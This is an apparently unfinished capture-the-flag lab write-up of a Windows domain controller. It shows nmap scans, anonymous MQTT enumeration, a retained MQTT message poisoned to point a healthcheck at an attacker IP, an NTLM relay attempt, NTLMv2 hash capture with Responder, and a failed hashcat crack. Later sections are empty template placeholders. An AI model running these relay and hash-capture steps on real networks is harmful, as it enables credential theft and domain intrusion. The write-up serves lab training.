
| Property         | Value                    |
| ---------------- | ------------------------ |
| **OS**           | Windows                  |
| **Difficulty**   | Hard                     |
| **Release Date** | YYYY-MM-DD               |
| **State**        | YYYY-MM-DD               |
| **IP**           | 10.10.10.X               |
| **Techniques**   | technique-1, technique-2 |
| **Tags**         | #web #privesc #linux     |

---
## Summary

Brief 2-3 sentence ogverview of the machine and attack path.

---
## Enumeration

### Nmap Scan

```
 sudo nmap -sC -sV 10.129.188.129 --open    
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-29 06:13 EDT
Nmap scan report for 10.129.188.129
Host is up (0.051s latency).
Not shown: 986 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Ghost Protocol Zero
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-29 18:14:04Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghostlink.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.ghostlink.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.ghostlink.htb
| Not valid before: 2026-03-03T16:53:53
|_Not valid after:  2027-03-03T16:53:53
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ghostlink.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.ghostlink.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.ghostlink.htb
| Not valid before: 2026-03-03T16:53:53
|_Not valid after:  2027-03-03T16:53:53
|_ssl-date: TLS randomness does not represent time
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghostlink.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.ghostlink.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.ghostlink.htb
| Not valid before: 2026-03-03T16:53:53
|_Not valid after:  2027-03-03T16:53:53
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ghostlink.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.ghostlink.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.ghostlink.htb
| Not valid before: 2026-03-03T16:53:53
|_Not valid after:  2027-03-03T16:53:53
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-10-29T18:14:48
|_  start_date: N/A
|_clock-skew: 8h00m01s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.84 seconds

```

```
sudo nmap -p- 10.129.188.129 --open        
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-29 06:14 EDT
Nmap scan report for 10.129.188.129
Host is up (0.049s latency).
Not shown: 65511 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1883/tcp  open  mqtt
2179/tcp  open  vmrdp
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49679/tcp open  unknown
49680/tcp open  unknown
49904/tcp open  unknown
49921/tcp open  unknown
51226/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 131.91 seconds

```

```
sudo nmap -sCV -p 1883 10.129.188.129 --open
Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-29 06:16 EDT
Nmap scan report for 10.129.188.129
Host is up (0.046s latency).

PORT     STATE SERVICE VERSION
1883/tcp open  mqtt
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|     $SYS/brokers/client_status/mqttui-fe5834be: {"status":"offline", "username":"(null)","ts":1793297823673,"reason_code":"0","client_id":"mqttui-fe5834be","IPv4":"127.0.0.1"}
|     $SYS/brokers/client_status/mqttui-82e3bef7: {"status":"online", "username":"(null)", "ts":1793297825758,"proto_name":"MQTT","keepalive":60,"return_code":"0","proto_ver":4,"client_id":"mqttui-82e3bef7","clean_start":1, "IPv4":"127.0.0.1"}
|_    $SYS/brokers/client_status/mqttui-6b8479: {"status":"offline", "username":"(null)","ts":1793297821599,"reason_code":"0","client_id":"mqttui-6b8479","IPv4":"127.0.0.1"}

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.52 seconds

```

added to /etc/hosts

```
10.129.188.129 ghostlink.htb dc01.ghostlink.htb dc01
```

### MTTQ Enumeration

https://hacktricks.wiki/en/network-services-pentesting/1883-pentesting-mqtt-mosquitto.html

```bash
apt-get install mosquitto mosquitto-clients
```

```
mosquitto_sub -h ghostlink.htb -t "#" -v
```

```
GhostProtocolZero/energy/grid/frequency {"timestamp":"2026-29-10-21:24:13","node":"node-2","telemetry":{"ip":"10.2.45.56","loadPercent":40,"hz":74252576.9}}
GhostProtocolZero/identity/trust-provider/state {"timestamp":"2026-29-10-21:24:13","node":"node-1","telemetry":{"ip":"10.1.12.34","tokenValidation":"delayed","authErrors":2}}
GhostProtocolZero/network/node/healthcheck {"timestamp":"2026-29-10-21:24:13","node":"node-3","telemetry":{"healthy":true,"url":"https://transport.ghostlink.htb/keepalive","lastCheckSecAgo":22,"ip":"10.4.23.11"}}
GhostProtocolZero/network/node/keepalive {"timestamp":"2026-29-10-21:24:13","node":"node-1","telemetry":{"rttMs":66,"status":"error","url":"https://core-telecom.ghostlink.htb/keepalive","ip":"10.1.12.34"}}
GhostProtocolZero/space/satellite/timing-drift {"timestamp":"2026-29-10-21:24:13","node":"node-3","telemetry":{"driftNs":219,"ip":"10.4.23.11","syncState":"resync"}}
GhostProtocolZero/telecom/core-routing/health {"timestamp":"2026-29-10-21:24:13","node":"node-1","telemetry":{"ip":"10.1.12.34","packetLoss":1276077930,"routeStability":"stable"}}
GhostProtocolZero/transport/logistics/status {"timestamp":"2026-29-10-21:24:13","node":"node-2","telemetry":{"throughput":73,"anomaly":"reroute","ip":"10.2.45.56"}}
GhostProtocolZero/systems/node/domain/healthcheck {"timestamp":"2026-29-10-21:24:26","node":"node-4","telemetry":{"healthy":true,"url":"dc01.ghostlink.htb/healthcheck","latencyMs":243,"ip":"10.129.189.74"}}
GhostProtocolZero/systems/node/repository/healthcheck {"timestamp":"2026-29-10-21:24:26","node":"node-5","telemetry":{"healthy":true,"url":"gpz-op26-toolkits.ghostlink.htb/healthcheck","lastCheckSecAgo":31,"responseCode":"200","ip":"172.16.20.20"}}
GhostProtocolZero/systems/node/secureshare/healthcheck {"timestamp":"2026-29-10-21:24:27","node":"node-6","telemetry":{"healthy":true,"url":"gpz-op26-secure.ghostlink.htb/healthcheck","lastCheckSecAgo":42,"responseCode":"200","ip":"172.16.20.10"}}
```

- **Anonymous access:** the broker accepts unauthenticated subscriptions to `#` (`username: (null)`).
- **Hostnames leaked:** `transport.ghostlink.htb`, `core-telecom.ghostlink.htb`, `dc01.ghostlink.htb`, `gpz-op26-toolkits.ghostlink.htb`, `gpz-op26-secure.ghostlink.htb`.
- **Internal IPs:** `10.1.12.34`, `10.2.45.56`, `10.4.23.11`, `10.129.189.74` (dc01), `172.16.20.20` (toolkits), `172.16.20.10` (secure share).

### MQTT topics and nodes

| Topic                                                    | Node   | Node IP       | Notable telemetry                                                               |
| -------------------------------------------------------- | ------ | ------------- | ------------------------------------------------------------------------------- |
| `GhostProtocolZero/energy/grid/frequency`                | node-2 | 10.2.45.56    | loadPercent 40, hz 74252576.9 (implausible value)                               |
| `GhostProtocolZero/identity/trust-provider/state`        | node-1 | 10.1.12.34    | tokenValidation “delayed”, authErrors 2                                         |
| `GhostProtocolZero/network/node/healthcheck`             | node-3 | 10.4.23.11    | healthy true, checks `https://transport.ghostlink.htb/keepalive`                |
| `GhostProtocolZero/network/node/keepalive`               | node-1 | 10.1.12.34    | status “error”, rttMs 66, checks `https://core-telecom.ghostlink.htb/keepalive` |
| `GhostProtocolZero/space/satellite/timing-drift`         | node-3 | 10.4.23.11    | driftNs 219, syncState “resync”                                                 |
| `GhostProtocolZero/telecom/core-routing/health`          | node-1 | 10.1.12.34    | packetLoss 1276077930 (implausible value), routeStability “stable”              |
| `GhostProtocolZero/transport/logistics/status`           | node-2 | 10.2.45.56    | throughput 73, anomaly “reroute”                                                |
| `GhostProtocolZero/systems/node/domain/healthcheck`      | node-4 | 10.129.189.74 | healthy true, latencyMs 243                                                     |
| `GhostProtocolZero/systems/node/repository/healthcheck`  | node-5 | 172.16.20.20  | healthy true, responseCode 200                                                  |
| `GhostProtocolZero/systems/node/secureshare/healthcheck` | node-6 | 172.16.20.10  | healthy true, responseCode 200                                                  |
### Hosts discovered

| Hostname                          | IP            | Source topic                           |
| --------------------------------- | ------------- | -------------------------------------- |
| `dc01.ghostlink.htb`              | 10.129.189.74 | `systems/node/domain/healthcheck`      |
| `gpz-op26-toolkits.ghostlink.htb` | 172.16.20.20  | `systems/node/repository/healthcheck`  |
| `gpz-op26-secure.ghostlink.htb`   | 172.16.20.10  | `systems/node/secureshare/healthcheck` |
| `transport.ghostlink.htb`         | not disclosed | `network/node/healthcheck` (node-3)    |
| `core-telecom.ghostlink.htb`      | not disclosed | `network/node/keepalive` (node-1)      |

## Publish 

```
mosquitto_pub -h ghostlink.htb -t 'test/injection' -r -m 'pentest'
```

```
mosquitto_sub -h ghostlink.htb -t 'test/injection' -v -W 2        
test/injection pentest
Timed out

```

## NTLM Relay

```
mosquitto_pub -h ghostlink.htb -r -t 'GhostProtocolZero/systems/node/secureshare/healthcheck' \
  -m '{"timestamp":"2026-29-10-21:24:26","node":"node-6","telemetry":{"healthy":true,"url":"http://10.10.14.148:8888/healthcheck","latencyMs":243,"ip":"10.129.189.74"}}'
                                                                 
```

```
impacket-ntlmrelayx -t ldap://10.129.189.74 --http-port 8888 -smb2support
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client SMB loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client WINRMS loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 8888
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Setting up WinRM (HTTP) Server on port 5985
[*] Setting up WinRMS (HTTPS) Server on port 5986
[*] Setting up RPC Server on port 135
[*] Setting up MSSQL Server on port 1433
[*] Setting up RDP Server on port 3389
[*] Multirelay disabled

[*] Servers started, waiting for connections
[*] (HTTP): Client requested path: /healthcheck
[*] (HTTP): Client requested path: /healthcheck
[*] (HTTP): Connection from 10.129.189.74 controlled, attacking target ldap://10.129.189.74
[*] (HTTP): Client requested path: /healthcheck
[-] (HTTP): Authenticating against ldap://10.129.189.74 as GHOSTLINK/SVC_CANARY FAILED
[*] (HTTP): Client requested path: /healthcheck
[*] (HTTP): Client requested path: /healthcheck
[*] (HTTP): Connection from 10.129.189.74 controlled, attacking target ldap://10.129.189.74
[*] (HTTP): Client requested path: /healthcheck
[-] (HTTP): Authenticating against ldap://10.129.189.74 as GHOSTLINK/SVC_CANARY FAILED
[*] (HTTP): Client requested path: /healthcheck
[*] (HTTP): Client requested path: /healthcheck
[*] (HTTP): Connection from 10.129.189.74 controlled, attacking target ldap://10.129.189.74
[*] (HTTP): Client requested path: /healthcheck
[-] (HTTP): Authenticating against ldap://10.129.189.74 as GHOSTLINK/SVC_CANARY FAILED
[*] (HTTP): Client requested path: /healthcheck
[*] (HTTP): Client requested path: /healthcheck
[*] (HTTP): Connection from 10.129.189.74 controlled, attacking target ldap://10.129.189.74
[*] (HTTP): Client requested path: /healthcheck
[-] (HTTP): Authenticating against ldap://10.129.189.74 as GHOSTLINK/SVC_CANARY FAILED
[*] (HTTP): Client requested path: /healthcheck
[*] (HTTP): Client requested path: /healthcheck
[*] (HTTP): Connection from 10.129.189.74 controlled, attacking target ldap://10.129.189.74
[*] (HTTP): Client requested path: /healthcheck
[-] (HTTP): Authenticating against ldap://10.129.189.74 as GHOSTLINK/SVC_CANARY FAILED
^C                                                                                      
```

Attack failed but discovered a user


trying with responder and setting the ip address 172.16.20.10 (`systems/node/secureshare/healthcheck`)

```
sudo responder -I tun0
```

```bash
mosquitto_pub -h ghostlink.htb -r -t 'GhostProtocolZero/systems/node/secureshare/healthcheck' \
  -m '{"timestamp":"2026-29-10-21:24:27","node":"node-6","telemetry":{"healthy":true,"url":"http://10.10.14.148/healthcheck","lastCheckSecAgo":42,"responseCode":"200","ip":"172.16.20.10"}}' 
```

```
[+] Listening for events...                                                                                         

[HTTP] NTLMv2 Client   : 10.129.189.74
[HTTP] NTLMv2 Username : ghostlink\svc_canary
[HTTP] NTLMv2 Hash     : svc_canary::ghostlink:afdbf9989345f00d:319C8080BFC4AB1CD3948BEF95E05C9C:0101000000000000F3A75D113568DD01767DD94FC72611DA00000000020008004200510036004B0001001E00570049004E002D0058003200460035004A005A0032005300530059004A00040014004200510036004B002E004C004F00430041004C0003003400570049004E002D0058003200460035004A005A0032005300530059004A002E004200510036004B002E004C004F00430041004C00050014004200510036004B002E004C004F00430041004C000800500050000000000000000000000000400000E18E8969BA1E95C7DF3D5DAEB3CFABE1EA986B2966C195F17A21E8739BA1403F9EA6E0B56B1FC312F086641EDEA22BE27F255F4E3441AFE2B8AB0BC43190031D0A001000000000000000000000000000000000000900220048005400540050002F00310030002E00310030002E00310034002E003100340038000000000000000000                                                           
[+] Exiting...

```


```
hashcat -m 5600 svc_canary.hash /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 7.1+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 21.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-sandybridge-AMD Ryzen 7 5700G with Radeon Graphics, 1468/2937 MB (1468 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (1155 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Approaching final keyspace - workload adjusted.           

Session..........: hashcat                                
Status...........: Exhausted
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: SVC_CANARY::ghostlink:afdbf9989345f00d:319c8080bfc4...000000
Time.Started.....: Thu Oct 29 18:16:06 2026 (9 secs)
Time.Estimated...: Thu Oct 29 18:16:15 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  1714.5 kH/s (1.91ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...:  kristenanne -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#01.: Util: 82%

Started: Thu Oct 29 18:15:50 2026
Stopped: Thu Oct 29 18:16:16 2026

```

does not crack.

enumerating gogs

img

commit in source code

```
curl -s http://gpz-op26-toolkits.ghostlink.htb/user/login | grep -i -E "gogs|version"
                <meta name="author" content="Gogs" />
                <meta name="description" content="Gogs is a painless self-hosted Git service" />
                <meta name="keywords" content="go, git, self-hosted, gogs">
                <meta property="og:title" content="Gogs">
                <meta property="og:description" content="Gogs is a painless self-hosted Git service.">
                <meta property="og:site_name" content="Gogs">
        <link rel="stylesheet" href="/css/gogs.min.css?v=5084b4a9b77a506f5e287e82e945e1c6882b827a">
        <script src="/js/gogs.js?v=5084b4a9b77a506f5e287e82e945e1c6882b827a"></script>
        <title>Sign In - Gogs</title>
                                                                        <a class="item" target="_blank" rel="noopener noreferrer" href="https://gogs.io/docs" rel="noreferrer">Help</a>
                                © 2026 Gogs
                                <a target="_blank" rel="noopener noreferrer" href="https://gogs.io">Website</a>
                                                                                                              
```

navigating to

https://github.com/gogs/gogs/commit/5084b4a9b77a506f5e287e82e945e1c6882b827a

vulnerable version 

img

CVE-2025-8110 (RCE authenticated - Gravità Alta/Critica) 

---
## Foothold

How you gained initial access to the machine.

### Vulnerability

Description of the vulnerability exploited.

### Exploitation

Step-by-step exploitation with commands.

```shell
# Commands used
```

---
## User Flag

### Lateral Movement (if applicable)

Steps to move from initial foothold to user access.

---
## Privilege Escalation

### Enumeration

What you found that leads to root/admin.

### Exploitation

Step-by-step privilege escalation.

```shell
# Commands used
```

---
## Remediation

- Key takeaway 1
- Key takeaway 2
- Key takeaway 3

---
## References

- [Reference 1](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)
- [Reference 2](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)